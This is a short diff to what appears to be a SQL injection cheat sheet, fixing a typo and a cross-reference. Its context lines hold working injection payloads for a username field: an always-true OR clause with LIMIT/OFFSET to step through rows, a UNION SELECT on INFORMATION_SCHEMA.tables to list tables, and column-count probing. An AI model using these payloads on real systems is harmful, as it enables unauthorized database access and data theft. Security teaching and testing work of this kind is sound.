@@ -17,7 +17,7 @@
   1. username => 'or '1'='1' LIMIT 1 OFFSET 2 -- '
   2. OFFSET is the key value here. This way, you can go through the whole table.
 
-- Get first table name, using DB name obtained above
+- Get first table name, using DB name obtained below
 
   1. username => fsdfs' UNION SELECT table_name, 1 FROM INFORMATION_SCHEMA.tables WHERE table_schema='test' -- '
 
@@ -27,7 +27,7 @@
 
   1. username => fsdfs' UNION SELECT 1, 2, 3 -- '
   2. The fsdfs is just random text to make the username query fail, since fsdfs is most likely not a real username in the system
-  3. Progressively increase the number of comma-separated values in the SELECT, until if doesn't fail
+  3. Progressively increase the number of comma-separated values in the SELECT, until it doesn't fail
 
 - Get DB name and DB user account
 
